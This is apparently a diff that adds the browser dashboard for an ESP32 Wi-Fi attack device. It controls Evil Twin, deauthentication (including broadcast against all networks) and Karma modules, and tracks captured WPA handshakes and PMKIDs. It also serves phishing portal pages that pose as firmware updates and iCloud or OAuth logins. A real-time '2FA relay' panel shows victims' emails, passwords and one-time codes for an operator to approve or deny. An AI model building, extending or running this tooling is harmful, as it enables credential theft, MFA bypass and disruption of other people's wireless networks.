+            const values = [pkt.ch, pkt.rssi, pkt.type_str, pkt.subtype_str, pkt.src, pkt.dst, pkt.len, pkt.info];
+            values.forEach(value => {
+                const cell = document.createElement('td');
+                cell.textContent = value == null ? '' : String(value);
+                row.appendChild(cell);
+            });
+            row.style.setProperty('--packet-rssi-color', rssiColor);
+            
+            tbody.insertBefore(row, tbody.firstChild);
+            if(tbody.children.length > 200) tbody.removeChild(tbody.lastChild);
+            
+            updateCounters();
+        }
+        
+        function populateChannels() {
+            const sel = document.getElementById('sniff-chan');
+            if(!sel) return;
+            sel.innerHTML = "";
+            
+            let grp24 = document.createElement('optgroup');
+            grp24.label = "2.4 GHz";
+            for(let i=1; i<=14; i++) {
+                let opt = document.createElement('option');
+                opt.value = i; opt.innerText = "CH " + i;
+                grp24.appendChild(opt);
+            }
+            sel.appendChild(grp24);
+
+            let grp5 = document.createElement('optgroup');
+            grp5.label = "5 GHz";
+            const ch5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165];
+            ch5.forEach(c => {
+                let opt = document.createElement('option');
+                opt.value = c; opt.innerText = "CH " + c;
+                grp5.appendChild(opt);
+            });
+            sel.appendChild(grp5);
+        }
+        
+        function togglePause() {
+            isSnifferPaused = !isSnifferPaused;
+            const btn = document.getElementById('btn-sniff-pause');
+            if(isSnifferPaused) {
+                btn.innerText = "RESUME VIEW";
+                btn.style.border = "1px solid var(--accent)";
+                btn.style.color = "var(--accent)";
+            } else {
+                btn.innerText = "PAUSE VIEW";
+                btn.style.border = "1px solid #444";
+                btn.style.color = "white";
+            }
+        }
+        
+        function clearSnifferTable() {
+            document.getElementById('sniffer-body').innerHTML = "";
+            totalPacketsRx = 0;
+            displayedPackets = 0;
+            updateCounters();
+        }
+
+        function updateCounters() {
+            const totEl = document.getElementById('pkt-total-count');
+            const dispEl = document.getElementById('pkt-display-count');
+            if(totEl) totEl.innerText = totalPacketsRx;
+            if(dispEl) dispEl.innerText = displayedPackets;
+        }
+        
+        function updateSubtypes() {
+            const type = document.getElementById('sniff-type').value;
+            const subSel = document.getElementById('sniff-subtype');
+            subSel.innerHTML = "";
+            subSel.disabled = false;
+
+            if (type == "0") {
+                let opt = document.createElement('option');
+                opt.value = 0; opt.innerText = "All Subtypes";
+                subSel.appendChild(opt);
+                subSel.disabled = true;
+                return;
+            }
+
+            if (SUBTYPES[type]) {
+                SUBTYPES[type].forEach(st => {
+                    let opt = document.createElement('option');
+                    opt.value = st.val;
+                    opt.innerText = st.name;
+                    subSel.appendChild(opt);
+                });
+            }
+        }
+
+        // ==========================================
+        // WEBSOCKET ENGINE
+        // ==========================================
+        let statusInFlight = false;      // one GET_STATUS at a time; prevents queue build-up
+        let statusPending = false;       // a fresh sample was requested while one was in flight
+        let reconnectAttempt = 0;        // exponential backoff counter
+
+        async function requestSystemStatus() {
+            if (!isConnected) return;
+            if (statusInFlight) { statusPending = true; return; }
+            statusInFlight = true;
+            try {
+                await requestSystemStatusInner();
+            } finally {
+                statusInFlight = false;
+                if (statusPending) {
+                    statusPending = false;
+                    requestSystemStatus();
+                }
+            }
+        }
+
+        function connectWS() {
+            log("Connecting to WebSocket...", "info");
+            ws = new WebSocket(WS_URL);
+
+            ws.onopen = () => {
+                isConnected = true;
+                reconnectAttempt = 0;        // reset backoff on a good connection
+                log("WebSocket Connected!", "info");
+                showToast("System Online");
+                if (statusInterval) clearInterval(statusInterval);
+                if (reconPollingInterval) clearInterval(reconPollingInterval);
+                setSideStatus(true);
+                // 3s (not 2s) keeps the read load modest on a single-radio device
+                statusInterval = setInterval(requestSystemStatus, 3000);
+                // Alternate polling
+                reconPollingInterval = setInterval(() => {
+                    fetchReconDataAp();
+                    setTimeout(fetchReconDataCli, 2000);
+                }, 5000);
+            };
+
+            ws.onclose = () => {
+                isConnected = false;
+                statusInFlight = false;
+                if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+                if (reconPollingInterval) { clearInterval(reconPollingInterval); reconPollingInterval = null; }
+                log("Connection lost. Reconnecting...", "error");
+                showToast("Connection Lost - Check WiFi");
+                setSideStatus(false);
+                // Exponential backoff 3s -> 6s -> 12s -> ... capped at 30s, so a
+                // flapping link does not hammer the ESP32 with reconnect storms.
+                const delay = Math.min(3000 * Math.pow(2, reconnectAttempt), 30000);
+                reconnectAttempt++;
+                log("Reconnecting in " + Math.round(delay / 1000) + "s...", "info");
+                setTimeout(connectWS, delay);
+            };
+
+            ws.onerror = (err) => {
+                console.error("WS Error:", err);
+                ws.close();
+            };
+
+            ws.onmessage = (event) => {
+                try {
+                    const msg = JSON.parse(event.data);
+                    if (msg.type === 'pcap_file') {
+                        const byteCharacters = atob(msg.payload);
+                        const byteNumbers = new Array(byteCharacters.length);
+                        for (let i = 0; i < byteCharacters.length; i++) {
+                            byteNumbers[i] = byteCharacters.charCodeAt(i);
+                        }
+                        const byteArray = new Uint8Array(byteNumbers);
+                        const blob = new Blob([byteArray], {type: "application/vnd.tcpdump.pcap"});
+                        const link = document.createElement('a');
+                        link.href = window.URL.createObjectURL(blob);
+                        link.download = msg.filename;
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                        showToast("PCAP Downloaded successfully!");
+                        return;
+                    }
+                    if (msg.type === 'packet') { handlePacket(msg); return; }
+                    if (msg.type === 'log') { log(msg.msg, msg.level); return; }
+                    if (msg.req_id && pendingRequests.has(msg.req_id)) {
+                        const { resolve, reject } = pendingRequests.get(msg.req_id);
+                        if (msg.status === 'error') reject(msg.message || "Unknown error");
+                        else resolve(msg);
+                        pendingRequests.delete(msg.req_id);
+                    }
+                } catch (e) { console.error("JSON Parse Error:", e); }
+            };
+        }
+
+        function sendCommand(cmdId, params = {}) {
+            return new Promise((resolve, reject) => {
+                if (!isConnected) { reject("WebSocket not connected"); return; }
+                const id = ++reqIdCounter;
+                pendingRequests.set(id, { resolve, reject });
+                const payload = JSON.stringify({ cmd: cmdId, req_id: id, ...params });
+                ws.send(payload);
+                setTimeout(() => {
+                    if (pendingRequests.has(id)) {
+                        pendingRequests.delete(id);
+                        reject("Timeout waiting for ESP32");
+                    }
+                }, 8000); 
+            });
+        }
+
+        // ==========================================
+        // MULTILANGUAGE (JSON Fetch)
+        // ==========================================
+        let currentTranslations = {};
+
+        async function changeLanguage(langCode) {
+            if (langCode !== 'en' && langCode !== 'zh') langCode = 'en';
+            try {
+                const response = await fetch(`/lang/${langCode}.json`);
+                if (!response.ok) throw new Error(`Impossibile caricare /lang/${langCode}.json`);
+                
+                currentTranslations = await response.json();
+                
+                document.querySelectorAll('[data-i18n]').forEach(el => {
+                    const key = el.getAttribute('data-i18n');
+                    if (currentTranslations[key]) {
+                        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+                            el.placeholder = currentTranslations[key];
+                        } else {
+                            el.innerText = currentTranslations[key];
+                        }
+                    }
+                });
+
+                const activeMenuItem = document.querySelector('.menu-item.active span[data-i18n]');
+                if (activeMenuItem) document.getElementById('page-title').innerText = activeMenuItem.innerText;
+
+                localStorage.setItem('esp32_lang', langCode);
+            } catch (error) { console.error("Errore Multilingua:", error); }
+        }
+
+        async function initLanguage() {
+            const savedLang = localStorage.getItem('esp32_lang') || ((navigator.language || '').toLowerCase().startsWith('zh') ? 'zh' : 'en');
+            const langSelect = document.getElementById('lang-select');
+            if (langSelect) langSelect.value = savedLang;
+            await changeLanguage(savedLang);
+        }
+        
+        // ==========================================
+        // FUNZIONI API (STATUS, SCAN, ETC.)
+        // ==========================================
+        async function requestSystemStatusInner() {
+            if (!isConnected) return;
+            try {
+                const data = await sendCommand(CMD.GET_STATUS);
+                
+                if (data.uptime) document.getElementById('uptime-val').innerText = data.uptime;
+                if (data.ram !== undefined) {
+                    document.getElementById('ram-text-val').innerText = data.ram + '%';
+                    const bar = document.getElementById('ram-bar');
+                    bar.style.width = data.ram + '%';
+                    bar.style.backgroundColor = data.ram > 85 ? 'var(--danger)' : 'var(--accent)';
+                }
+
+                const modEt = document.getElementById('mod-et');
+                const modDeauth = document.getElementById('mod-deauth');
+                const modKarma = document.getElementById('mod-karma');
+                const globalBadge = document.getElementById('global-status-badge').querySelector('span');
+
+                const setInactive = (el) => {
+                    el.style.borderColor = "#333";
+                    el.querySelector('.mod-status').innerText = currentTranslations["status_inactive"] || "INACTIVE";
+                    el.querySelector('.mod-status').style.color = "#444";
+                };
+                const setActive = (el, color) => {
+                    el.style.borderColor = color;
+                    el.querySelector('.mod-status').innerText = "RUNNING";
+                    el.querySelector('.mod-status').style.color = color;
+                    el.querySelector('.mod-status').style.textShadow = `0 0 10px ${color}`;
+                };
+
+                setInactive(modEt);
+                setInactive(modDeauth);
+                setInactive(modKarma);
+
+                let activeModules = [];
+                if(data.et_running) { setActive(modEt, "var(--accent)"); activeModules.push("EVIL TWIN"); }
+                if(data.deauth_running) { setActive(modDeauth, "var(--danger)"); activeModules.push("DEAUTH"); }
+                if(data.karma_running) { setActive(modKarma, "#e040fb"); activeModules.push("KARMA"); }
+
+                const gbParent = document.getElementById('global-status-badge');
+                if(activeModules.length > 0) {
+                    globalBadge.innerText = activeModules.join(" + ");
+                    gbParent.style.borderColor = "var(--accent)";
+                    gbParent.style.color = "#fff";
+                    gbParent.style.background = "rgba(0, 230, 118, 0.1)";
+                    gbParent.style.boxShadow = "0 0 10px rgba(0,0,0,0.5)";
+                } else {
+                    globalBadge.innerText = currentTranslations["system_idle"] || "SYSTEM IDLE";
+                    gbParent.style.borderColor = "#444";
+                    gbParent.style.color = "#aaa";
+                    gbParent.style.background = "#333";
+                    gbParent.style.boxShadow = "none";
+                }
+
+                if (data.et_running) {
+                    document.getElementById('home-ssid').innerText = data.ssid || "Unknown";
+                    document.getElementById('home-bssid').innerText = data.bssid || "--";
+                    document.getElementById('home-ch').innerText = data.ch || "--";
+                    document.getElementById('home-vendor').innerText = data.vendor || "Unknown";
+                    document.getElementById('home-auth').innerText = data.auth || "Open";
+                    
+                    const rssi = data.rssi || -100;
+                    const rssiEl = document.getElementById('home-rssi');
+                    rssiEl.innerText = rssi + " dBm";
+                    rssiEl.style.color = rssi > -60 ? "#0f0" : (rssi > -80 ? "#ffab40" : "#ff5252");
+
+                    const badge5g = document.getElementById('home-5g-badge');
+                    if (data.has_5g) {
+                        badge5g.innerHTML = `DETECTED CH ${data.ch_5g}`;
+                        badge5g.style.background = "rgba(0, 188, 212, 0.2)";
+                        badge5g.style.color = "#00bcd4";
+                        badge5g.style.border = "1px solid #00bcd4";
+                    } else {
+                        badge5g.innerText = "NOT FOUND";
+                        badge5g.style.background = "#222";
+                        badge5g.style.color = "#555";
+                        badge5g.style.border = "1px solid transparent";
+                    }
+
+                } else if (!data.et_running && currentTarget) {
+                    document.getElementById('home-ssid').innerText = currentTarget.ssid;
+                    document.getElementById('home-bssid').innerText = currentTarget.bssid;
+                    document.getElementById('home-ch').innerText = currentTarget.channel;
+                    document.getElementById('home-auth').innerText = "SELECTED";
+                    document.getElementById('home-rssi').innerText = currentTarget.signal + " dBm";
+                } else {
+                    document.getElementById('home-ssid').innerText = currentTranslations["no_target"] || "No Target";
+                    document.getElementById('home-bssid').innerText = "--:--:--:--:--:--";
+                    document.getElementById('home-ch').innerText = "--";
+                    document.getElementById('home-vendor').innerText = "--";
+                    document.getElementById('home-auth').innerText = "--";
+                    document.getElementById('home-rssi').innerText = "-- dBm";
+                }
+
+                // Dashboard access (URL + PIN) - so no serial console is needed
+                if (data.ap_ip && data.admin_path) {
+                    const url = `http://${data.ap_ip}${data.admin_path}`;
+                    const urlEl = document.getElementById('admin-url');
+                    if (urlEl) urlEl.innerText = url;
+                    const pinEl = document.getElementById('admin-pin');
+                    if (pinEl) pinEl.innerText = data.admin_pin || '----';
+                }
+
+                // PMF / WPA3 warning (deauth will be ignored)
+                const pmfEl = document.getElementById('pmf-warning');
+                if (pmfEl) pmfEl.style.display = (data.et_running && data.pmf_warn) ? 'block' : 'none';
+
+                // Reflect the active attack mode into the selector while running
+                if (data.et_running && data.et_mode !== undefined) {
+                    const modeSel = document.getElementById('attack-mode');
+                    if (modeSel) modeSel.value = String(data.et_mode);
+                }
+
+                const hsBadge = document.getElementById('home-hs-badge');
+                if (data.hs_state === 2) { 
+                    hsBadge.innerText = "CAPTURED (4-WAY)";
+                    hsBadge.style.background = "rgba(0, 230, 118, 0.2)";
+                    hsBadge.style.color = "var(--accent)";
+                    hsBadge.style.border = "1px solid var(--accent)";
+                } else if (data.hs_state === 1) { 
+                    hsBadge.innerText = "CAPTURED (PMKID)";
+                    hsBadge.style.background = "rgba(255, 171, 64, 0.2)";
+                    hsBadge.style.color = "#ffab40";
+                    hsBadge.style.border = "1px solid #ffab40";
+                } else {
+                    hsBadge.innerText = currentTranslations["status_waiting"] || "WAITING";
+                    hsBadge.style.background = "#222";
+                    hsBadge.style.color = "#555";
+                    hsBadge.style.border = "1px solid transparent";
+                }
+
+                document.getElementById('home-clients').innerText = data.n_clients || 0;
+                document.getElementById('home-aps').innerText = data.n_aps || 0;
+
+                const txSent = data.tx_sent || 0;
+                const txDrop = data.tx_drop || 0;
+                const txPps = data.tx_pps || 0;
+                const totalTx = txSent + txDrop;
+
+                document.getElementById('stat-tx-sent').innerText = formatBigNumber(txSent);
+                document.getElementById('stat-tx-drop').innerText = formatBigNumber(txDrop);
+                document.getElementById('stat-tx-pps').innerText = formatBigNumber(txPps);
+
+                let queueHealth = 100; 
+                if (totalTx > 0) {
+                    queueHealth = Math.round((txSent / totalTx) * 100);
+                }
+
+                let msg = currentTranslations["sys_idle_msg"] || "System idle.";
+                let color = "#666";
+                // La barra ora segue ESATTAMENTE la percentuale di Health calcolata
+                let barWidth = queueHealth; 
+
+                if (txPps === 0) {
+                    barWidth = 0; // A riposo azzeriamo la barra
+                }
+                else if (txPps >= 40) {
+                    // PPS Alti: L'attacco è letale. La barra è VERDE, anche se scende al 58%
+                    color = "#00e676"; 
+                    msg = `LETHAL: High injection rate. AP+STA balancing perfectly.`;
+                } 
+                else if (txPps >= 15) {
+                    // PPS Medi: L'attacco è discreto. La barra è ARANCIONE
+                    color = "#ffab40"; 
+                    msg = `MODERATE: Injection active. Radio is heavily slicing time.`;
+                } 
+                else {
+                    // PPS Bassi: L'attacco è scarso.
+                    if (queueHealth < 50) {
+                        // Se stiamo anche droppando tanto, la situazione è critica (ROSSO)
+                        color = "#ff1744"; 
+                        msg = `POOR: Severe packet loss and low rate. Radio struggling.`;
+                    } else {
+                        // Inviamo piano ma non droppiamo (ARANCIONE)
+                        color = "#ffab40"; 
+                        msg = `WEAK: Low injection rate.`;
+                    }
+                }
+
+                document.getElementById('stat-quality-perc').innerText = txPps > 0 ? (queueHealth + "% Health") : "IDLE";
+                document.getElementById('stat-quality-bar').style.width = barWidth + "%";
+                document.getElementById('stat-quality-bar').style.backgroundColor = color;
+                document.getElementById('stat-message').innerText = msg;
+                document.getElementById('stat-message').style.color = color;
+
+                /*const sdEl = document.getElementById('status-sd');
+                if (data.sd !== undefined) {
+                    sdEl.innerText = data.sd ? "REC" : "ERR";
+                    sdEl.style.color = data.sd ? "var(--accent)" : "var(--danger)";
+                }*/
+                const usbBadge = document.getElementById('badge-usb');
+                if (data.usb_wifi !== undefined) {
+                    usbBadge.style.display = data.usb_wifi ? "flex" : "none";
+                }
+
+                // --- AGGIORNAMENTO NETWORK STATUS (IP, GW, MASK) ---
+                const dashStaSsid = document.getElementById('dash-sta-ssid');
+                const dashStaBadge = document.getElementById('dash-sta-badge');
+                const dashStaIp = document.getElementById('dash-sta-ip');
+                const dashStaGw = document.getElementById('dash-sta-gw');
+                const dashStaMask = document.getElementById('dash-sta-mask');
+
+                const staStatusEl = document.getElementById('sta-status');
+                const staIpEl = document.getElementById('sta-ip');
+                const staGwEl = document.getElementById('sta-gw');
+                const staMaskEl = document.getElementById('sta-mask');
+                const staSsidEl = document.getElementById('sta-connected-ssid');
+
+                const activeSsid = data.wifi_sta_ssid ? data.wifi_sta_ssid : "No Network";
+
+                
+                if (data.has_ip) {
+                    // Dashboard Card
+                    if(dashStaBadge) {
+                        dashStaSsid.innerText = activeSsid;
+                        dashStaIp.innerText = data.ip;
+                        dashStaGw.innerText = data.gateway || "--.--.--.--";
+                        dashStaMask.innerText = data.netmask || "--.--.--.--";
+                        dashStaBadge.innerText = "CONNECTED";
+                        dashStaBadge.style.background = "rgba(0, 230, 118, 0.2)";
+                        dashStaBadge.style.color = "var(--accent)";
+                        dashStaBadge.style.border = "1px solid var(--accent)";
+                    }
+                    // STA Tab
+                    if(staStatusEl) {
+                        staStatusEl.innerText = "CONNECTED";
+                        staStatusEl.style.color = "var(--accent)";
+                        staIpEl.innerText = data.ip;
+                        staGwEl.innerText = data.gateway || "--.--.--.--";
+                        staMaskEl.innerText = data.netmask || "--.--.--.--";
+                        if(staSsidEl) staSsidEl.innerText = activeSsid;
+                    }
+                }
+                else if (data.wifi_connected) {
+                    // Dashboard Card
+                    if(dashStaBadge) {
+                        dashStaSsid.innerText = activeSsid;
+                        dashStaIp.innerText = "--.--.--.--";
+                        dashStaGw.innerText = "--.--.--.--";
+                        dashStaMask.innerText = "--.--.--.--";
+                        dashStaBadge.innerText = "DHCP REQ...";
+                        dashStaBadge.style.background = "rgba(255, 171, 64, 0.2)";
+                        dashStaBadge.style.color = "#ffab40";
+                        dashStaBadge.style.border = "1px solid #ffab40";
+                    }
+                    // STA Tab
+                    if(staStatusEl) {
+                        staStatusEl.innerText = "OBTAINING IP...";
+                        staStatusEl.style.color = "#ffab40";
+                        staIpEl.innerText = "--.--.--.--";
+                        if(staSsidEl) staSsidEl.innerText = activeSsid;
+                    }
+                } else {
+                    // Dashboard Card
+                    if(dashStaBadge) {
+                        dashStaSsid.innerText = "No Network";
+                        dashStaIp.innerText = "--.--.--.--";
+                        dashStaGw.innerText = "--.--.--.--";
+                        dashStaMask.innerText = "--.--.--.--";
+                        dashStaBadge.innerText = "OFFLINE";
+                        dashStaBadge.style.background = "#222";
+                        dashStaBadge.style.color = "#555";
+                        dashStaBadge.style.border = "1px solid transparent";
+                    }
+                    // STA Tab
+                    if(staStatusEl) {
+                        staStatusEl.innerText = "DISCONNECTED";
+                        staStatusEl.style.color = "var(--danger)";
+                        staIpEl.innerText = "--.--.--.--";
+                        staGwEl.innerText = "--.--.--.--";
+                        staMaskEl.innerText = "--.--.--.--";
+                        if(staSsidEl) staSsidEl.innerText = "NONE";
+                    }
+                }
+            } catch (e) { console.error(e); }
+        }
+
+        async function scanNetworks() {
+            log("Starting WiFi Scan (WS)...");
+            const tbody = document.getElementById('wifi-networks-body');
+            tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:var(--accent);">Scanning in progress...</td></tr>`;
+            
+            try {
+                const response = await sendCommand(CMD.WIFI_SCAN);
+                const networks = response.data; 
+
+                tbody.innerHTML = '';
+                if (!networks || networks.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="7" style="text-align:center;">${currentTranslations["no_scan_data"] || "No networks found"}</td></tr>`;
+                    return;
+                }
+
+                networks.sort((a, b) => b.signal - a.signal);
+                networks.forEach(net => {
+                    const tr = document.createElement('tr');
+                    const values = [
+                        net.ssid && net.ssid.trim() ? net.ssid : '[Hidden SSID]',
+                        net.signal, net.channel, net.bssid, net.authmode, net.wps ? 'Yes' : 'No'
+                    ];
+                    values.forEach((value, index) => {
+                        const td = document.createElement('td');
+                        td.textContent = value == null ? '' : String(value);
+                        if (index === 0) td.style.fontWeight = 'bold';
+                        if (index === 3) td.style.fontFamily = 'monospace';
+                        tr.appendChild(td);
+                    });
+                    const actionCell = document.createElement('td');
+                    const button = document.createElement('button');
+                    button.textContent = 'TARGET';
+                    button.addEventListener('click', () => selectTarget(
+                        String(net.ssid || ''), String(net.bssid || ''),
+                        Number(net.channel) || 0, Number(net.signal) || 0,
+                        Number(net.authmode_code) || 0
+                    ));
+                    actionCell.appendChild(button);
+                    tr.appendChild(actionCell);
+                    tbody.appendChild(tr);
+                });
+            } catch (err) {
+                log(`Scan Error: ${err}`, "error");
+                tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:var(--danger);">Scan Failed</td></tr>';
+            }
+        }
+
+        async function loadApSettings() {
+            try {
+                const data = await sendCommand(CMD.GET_AP_SETTINGS);
+                document.getElementById('ssid').value = data.ssid || '';
+                document.getElementById('password').value = data.password || '';
+                document.getElementById('channel').value = data.channel || 1;
+                document.getElementById('tx_rate').value = data.tx_rate !== undefined ? data.tx_rate : 15;
+            } catch (err) { log("Error loading settings", "error"); }
+        }
+
+        async function handleSettings(e) {
+            e.preventDefault();
+            const ssid = document.getElementById('ssid').value;
+            const password = document.getElementById('password').value;
+            const channel = parseInt(document.getElementById('channel').value);
+            const tx_rate = parseInt(document.getElementById('tx_rate').value);
+
+            try {
+                showToast("Saving...");
+                const res = await sendCommand(CMD.SET_AP_SETTINGS, { ssid, password, channel, tx_rate });
+                if(res.status === "ok") { showToast("Settings Saved!"); }
+            } catch (err) { showToast("Error saving settings"); }
+        }
+
+        function selectTarget(ssid, bssid, channel, signal, authmode) {
+            currentTarget = { ssid, bssid, channel, signal, authmode };
+            document.getElementById('current-target-ssid').innerText = ssid;
+            document.getElementById('current-target-bssid').innerText = bssid;
+            document.getElementById('home-ssid').innerText = ssid;
+            const ssfSsid = document.getElementById('ssf-target-ssid');
+            if(ssfSsid) {
+                if (ssid && ssid.trim() !== "") {
+                    ssfSsid.innerText = ssid;
+                    ssfSsid.style.color = "white";
+                } else {
+                    ssfSsid.innerText = "[Hidden SSID]";
+                    ssfSsid.style.color = "#666";
+                }
+                document.getElementById('ssf-target-bssid').innerText = bssid;
+                document.getElementById('ssf-target-ch').innerText = channel;
+            }
+
+            const staSsidInput = document.getElementById('sta-ssid');
+            if (staSsidInput) {
+                staSsidInput.value = ssid || "";
+            }
+
+            showToast(`Target Selected: ${ssid || '[Hidden SSID]'}`);
+            
+            // Warn early if the chosen AP uses WPA3/PMF: deauth will be ignored.
+            // authmode codes: 6=WPA3_PSK, 7=WPA2_WPA3_PSK, 10=WPA3_ENT_192,
+            // 13=WPA3_EXT, 14=WPA3_EXT_MIXED
+            const amNum = parseInt(authmode, 10);
+            const isPmf = [6,7,10,13,14].includes(amNum);
+            const pmfEl = document.getElementById('pmf-warning');
+            if (pmfEl) pmfEl.style.display = isPmf ? 'block' : 'none';
+            
+            const evilTwinMenu = document.querySelectorAll('.menu-item')[3]; 
+            showView('view-eviltwin', evilTwinMenu);
+            if(document.getElementById('view-deauth').classList.contains('active')) updateDeauthUI();
+        }
+
+        function updateDeauthUI() {
+            const mode = document.getElementById('deauth-mode').value;
+            const ssidEl = document.getElementById('deauth-target-ssid');
+            const bssidEl = document.getElementById('deauth-target-bssid');
+            const chEl = document.getElementById('deauth-target-ch');
+            const broadcastChContainer = document.getElementById('deauth-broadcast-channel-container');
+            const broadcastChSelect = document.getElementById('deauth-broadcast-channel');
+
+            if (mode === 'broadcast') {
+                broadcastChContainer.style.display = 'block'; // Mostra il selettore
+                ssidEl.innerText = "ALL NETWORKS (BROADCAST)";
+                ssidEl.style.color = "#ffab40";
+                bssidEl.innerText = "FF:FF:FF:FF:FF:FF";
+                
+                // Legge il canale dal nuovo menu
+                const selectedCh = broadcastChSelect.value;
+                if (selectedCh === "0") {
+                    chEl.innerText = "HOPPING (ALL)";
+                } else {
+                    chEl.innerText = selectedCh;
+                }
+            } else {
+                broadcastChContainer.style.display = 'none'; // Nasconde il selettore
+                ssidEl.style.color = "white";
+                if (currentTarget) {
+                    ssidEl.innerText = currentTarget.ssid;
+                    bssidEl.innerText = currentTarget.bssid;
+                    chEl.innerText = currentTarget.channel;
+                } else {
+                    ssidEl.innerText = currentTranslations["no_target_selected"] || "No Target Selected";
+                    bssidEl.innerText = "--:--:--:--:--:--";
+                    chEl.innerText = "--";
+                }
+            }
+        }
+
+        // ---- Portal UA log / auto delivery ----
+        async function setPortalAuto(enabled) {
+            try {
+                await sendCommand(CMD.PORTAL_UA_MODE, { auto: enabled ? 1 : 0 });
+                log('Portal auto delivery ' + (enabled ? 'ON' : 'OFF'), 'info');
+                refreshPortalState();
+            } catch (e) { showToast('Failed to change mode'); }
+        }
+
+        async function refreshPortalUaLog() {
+            try {
+                const res = await sendCommand(CMD.PORTAL_UA_LOG);
+                const rows = res.entries || [];
+                const body = document.getElementById('portal-ua-body');
+                if (!body) return;
+
+                const auto = document.getElementById('portal-auto');
+                if (auto) auto.checked = !!res.auto;
+
+                document.getElementById('portal-ua-count').textContent = String(rows.length);
+                body.replaceChildren();
+
+                if (!rows.length) {
+                    const tr = document.createElement('tr');
+                    tr.className = 'empty';
+                    const td = document.createElement('td');
+                    td.colSpan = 3;
+                    td.textContent = currentTranslations['portal_no_ua'] || 'No visitors yet.';
+                    tr.appendChild(td);
+                    body.appendChild(tr);
+                    return;
+                }
+
+                rows.forEach(row => {
+                    const tr = document.createElement('tr');
+                    const cUa = document.createElement('td');
+                    cUa.style.whiteSpace = 'normal';
+                    cUa.style.maxWidth = '520px';
+                    cUa.textContent = row.ua || '—';
+
+                    const cServed = document.createElement('td');
+                    const b = document.createElement('span');
+                    b.className = 'badge accent';
+                    b.textContent = PORTAL_LABELS[row.scheme] || ('scheme ' + row.scheme);
+                    cServed.appendChild(b);
+
+                    const cWhen = document.createElement('td');
+                    cWhen.className = 'mono';
+                    cWhen.textContent = (row.age !== undefined ? row.age + 's ago' : '—');
+
+                    tr.append(cUa, cServed, cWhen);
+                    body.appendChild(tr);
+                });
+            } catch (e) { /* link down */ }
+        }
+
+        // ---- Portal login sessions (2FA relay) ----
+        let portalSessionsTimer = null;
+
+        const STAGE_LABEL = { 0: '—', 1: 'creds', 2: '2FA' };
+        const DECISION_LABEL = { 0: 'Pending', 1: 'Approved', 2: 'Denied' };
+
+        async function refreshPortalSessions() {
+            try {
+                const res = await sendCommand(CMD.PORTAL_SESSIONS);
+                const rows = res.sessions || [];
+                const body = document.getElementById('portal-sessions-body');
+                if (!body) return;
+
+                document.getElementById('portal-session-count').textContent = String(rows.length);
+                body.replaceChildren();
+
+                if (!rows.length) {
+                    const tr = document.createElement('tr');
+                    tr.className = 'empty';
+                    const td = document.createElement('td');
+                    td.colSpan = 6;
+                    td.textContent = currentTranslations['portal_no_sessions'] || 'No login attempts yet.';
+                    tr.appendChild(td);
+                    body.appendChild(tr);
+                    return;
+                }
+
+                rows.sort((a, b) => b.session - a.session).forEach(row => {
+                    const tr = document.createElement('tr');
+
+                    const cSid = document.createElement('td');
+                    cSid.className = 'mono';
+                    cSid.textContent = String(row.session);
+
+                    const cMail = document.createElement('td');
+                    cMail.textContent = row.email || '—';
+
+                    const cPass = document.createElement('td');
+                    cPass.className = 'mono';
+                    cPass.textContent = row.password || '—';
+
+                    const cOtp = document.createElement('td');
+                    cOtp.className = 'mono';
+                    cOtp.textContent = row.otp || '—';
+
+                    const cState = document.createElement('td');
+                    const badge = document.createElement('span');
+                    badge.className = 'badge ' + (row.approved === 1 ? 'ok' : row.approved === 2 ? 'bad' : 'warn');
+                    badge.textContent = (DECISION_LABEL[row.approved] || 'Pending') + ' · ' + (STAGE_LABEL[row.stage] || '—');
+                    cState.appendChild(badge);
+
+                    const cAct = document.createElement('td');
+                    const okBtn = document.createElement('button');
+                    okBtn.className = 'mini primary';
+                    okBtn.textContent = 'ALLOW';
+                    okBtn.addEventListener('click', () => decidePortal(row.session, 1));
+                    const noBtn = document.createElement('button');
+                    noBtn.className = 'mini danger';
+                    noBtn.textContent = 'DENY';
+                    noBtn.style.marginLeft = '6px';
+                    noBtn.addEventListener('click', () => decidePortal(row.session, 2));
+                    cAct.append(okBtn, noBtn);
+
+                    tr.append(cSid, cMail, cPass, cOtp, cState, cAct);
+                    body.appendChild(tr);
+                });
+            } catch (e) { /* link down; the status poll will surface it */ }
+        }
+
+        async function decidePortal(session, decision) {
+            try {
+                await sendCommand(CMD.PORTAL_DECIDE, { session: session, decision: decision });
+                log('Portal session ' + session + ' -> ' + (decision === 1 ? 'approved' : 'denied'), 'success');
+                refreshPortalSessions();
+            } catch (e) {
+                showToast('Decision failed');
+            }
+        }
+
+        function startPortalSessionsPolling() {
+            stopPortalSessionsPolling();
+            refreshPortalSessions();
+            refreshPortalUaLog();
+            portalSessionsTimer = setInterval(() => { refreshPortalSessions(); refreshPortalUaLog(); }, 2000);
+        }
+
+        function stopPortalSessionsPolling() {
+            if (portalSessionsTimer) { clearInterval(portalSessionsTimer); portalSessionsTimer = null; }
+        }
+
+        // ---- Portal page delivery ----
+        const PORTAL_LABELS = {
+            0: 'Firmware Upgrade',
+            1: 'Fake Network Manager',
+            2: 'Plugin Update',
+            3: 'OAuth Login',
+            4: 'iCloud Login',
+            255: 'Admin page'
+        };
+
+        async function deliverPortal() {
+            const sel = document.getElementById('portal-page');
+            const scheme = parseInt(sel.value, 10);
+            try {
+                showToast('Delivering page…');
+                const res = await sendCommand(CMD.SET_PORTAL_SCHEME, { scheme: scheme });
+                if (res.status === 'ok') {
+                    showToast('Portal page updated');
+                    log('Portal page -> ' + (PORTAL_LABELS[scheme] || scheme), 'success');
+                    refreshPortalState();
+                } else {
+                    showToast(res.message || 'Failed');
+                }
+            } catch (e) {
+                showToast('Delivery failed');
+                log('Portal deliver error: ' + e, 'error');
+            }
+        }
+
+        async function refreshPortalState() {
+            try {
+                const res = await sendCommand(CMD.GET_STATUS);
+                const v = (res.portal_scheme === undefined) ? 255 : res.portal_scheme;
+                const badge = document.getElementById('portal-current');
+                if (badge) badge.textContent = PORTAL_LABELS[v] || ('scheme ' + v);
+                const autoEl = document.getElementById('portal-auto');
